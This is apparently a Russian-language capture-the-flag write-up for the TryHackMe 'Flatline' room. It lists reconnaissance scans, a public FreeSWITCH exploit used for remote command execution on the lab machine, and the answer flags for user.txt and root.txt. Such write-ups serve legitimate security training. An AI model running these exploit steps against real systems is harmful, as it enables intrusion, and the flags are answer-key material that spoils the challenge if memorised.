[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Flatline](https://tryhackme.com/r/room/flatline) 

Всего 1 заданиe:
## Задание 1
Что такое флаги?

Загрузка и выполнение операций на этом компьютере могут происходить медленнее, чем обычно.
### Ответьте на вопросы ниже
Что такое флаг user.txt?
```commandline
nmap -sC -sV <IP>
nmap --script="rdp-*" -p 3389 <IP> -vv -Pn
searchsploit freeswitch
# https://www.exploit-db.com/exploits/47799
python3 exploit.py <IP> whoami
python3 exploit.py <IP> dir
python3 exploit.py <IP> "dir C:\\Users\\"
python3 exploit.py <IP> "dir C:\\Users\\Nekrotic\\Desktop\\"
```
```commandline
THM{64bca0843d535fa73eecdc59d27cbe26}
```
Что такое флаг root.txt?
```commandline
searchsploit openclinic
```
```commandline
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)